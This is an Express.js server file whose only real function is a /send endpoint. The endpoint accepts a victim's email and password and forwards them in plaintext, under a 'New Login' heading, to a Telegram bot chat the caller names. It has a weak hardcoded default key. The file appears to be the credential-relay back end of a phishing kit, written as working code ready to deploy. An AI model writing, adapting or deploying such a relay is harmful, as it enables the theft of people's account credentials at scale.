import express from "express";
import axios from "axios";

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());

// API key - consider using environment variables for security
const API_KEY = process.env.API_KEY || "flash";

// Function to send message to Telegram bot
async function sendToTelegram(botToken, userId, message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: userId,
      text: message,
      parse_mode: "HTML",
    });
    return true;
  } catch (error) {
    console.error("Telegram API error:", error.response?.data || error.message);
    return false;
  }
}

// API endpoint
app.post("/send", async (req, res) => {
  const { api_key, bot_token, user_id, email, password } = req.body;

  // Check API key
  if (api_key !== API_KEY) {
    return res.status(403).json({ success: false, error: "Invalid API key" });
  }

  // Validate required fields
  if (!bot_token || !user_id || !email || !password) {
    return res
      .status(400)
      .json({ success: false, error: "Missing required fields" });
  }

  // Create message
  const message = `<b>New Login</b>\n📧 Email: ${email}\n🔑 Password: ${password}`;

  // Send to Telegram
  const sent = await sendToTelegram(bot_token, user_id, message);

  if (!sent) {
    return res
      .status(500)
      .json({ success: false, error: "Failed to send message to Telegram" });
  }

  res.json({ success: true, message: "Message sent to Telegram" });
});

// Root endpoint for health checks
app.get("/", (req, res) => {
  res.json({ 
    success: true, 
    message: "Telegram API is running",
    usage: "Send a POST request to /send with api_key, bot_token, user_id, email, and password"
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 API running on port ${PORT}`);
});
